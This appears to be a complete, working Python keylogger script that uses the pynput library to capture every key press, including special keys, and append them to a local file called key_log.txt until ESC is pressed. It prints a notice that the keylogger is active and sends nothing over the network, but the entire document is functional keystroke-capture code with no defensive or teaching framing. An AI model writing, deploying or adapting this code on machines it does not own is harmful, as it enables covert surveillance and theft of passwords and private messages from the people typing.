# Import the necessary library
from pynput import keyboard

# Initialize global variables for logging
log = []

# Function to append each key press to the log list
def on_press(key):
    try:
        # Log the alphanumeric keys
        log.append(key.char)
    except AttributeError:
        # Log special keys in a human-readable format
        log.append(f'[{key}]')

# Function to save the log to a file when ESC is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        save_log()
        return False  # Stop the listener

# Function to save the key logs to a file
def save_log():
    with open("key_log.txt", "a") as log_file:
        for entry in log:
            log_file.write(str(entry))
        log_file.write("\n")  # Add a newline after each logging session

# Main function to start the listener
def start_keylogger():
    # Listen for key press and release events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger active. Press ESC to stop and save log.")
    start_keylogger()
